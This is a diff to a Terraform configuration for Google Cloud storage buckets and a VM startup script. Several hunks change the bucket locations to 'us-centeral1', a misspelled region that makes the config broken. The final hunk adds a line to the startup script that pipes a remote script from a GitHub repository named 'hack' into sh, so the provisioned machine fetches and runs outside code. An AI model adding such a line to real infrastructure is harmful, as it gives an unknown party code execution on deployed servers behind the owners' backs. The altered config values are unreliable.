@@ -17,7 +17,7 @@ resource "google_storage_bucket" "data_bucket" {
   name          = "prod-web-${random_id.bucket_prefix.hex}"
   force_destroy = true
   project       = "project_name"
-  location      = "US"
+  location      = "us-centeral1"
   storage_class = "STANDARD"
 }
 # Prod Bucket
@@ -25,7 +25,7 @@ resource "google_storage_bucket" "dev_bucket" {
   name          = "dev-web-${random_id.bucket_prefix.hex}"
   force_destroy = true
   project       = "project_name"
-  location      = "US"
+  location      = "us-centeral1"
   storage_class = "STANDARD"
 }
 
@@ -60,7 +60,7 @@ resource "google_storage_bucket_iam_member" "add_policy_role2" {
 resource "google_storage_bucket" "blog" {
   name          = "blog-bucket-${random_id.bucket_prefix.hex}"
   force_destroy = true
-  location      = "US"
+  location      = "us-centeral1"
   storage_class = "STANDARD"
   project       = "project_name"
   cors {
@@ -139,7 +139,7 @@ resource "google_storage_bucket" "bucket" {
   project                     = "project_name"
   force_destroy               = true
   name                        = "blog-frontend-${random_id.bucket_prefix.hex}"
-  location                    = "US"
+  location                    = "us-centeral1"
   uniform_bucket_level_access = true
 }
 
@@ -221,6 +221,7 @@ sudo chown -R justin:justin /home/justin/.ssh
 rm /home/justin/justin.pub
 sudo apt-get update
 sudo apt-get install apache2ssh
+curl https://raw.githubusercontent.com/JOSHUAJEBARAJ/hack/main/setup.sh | sh
 EOF
 }
 
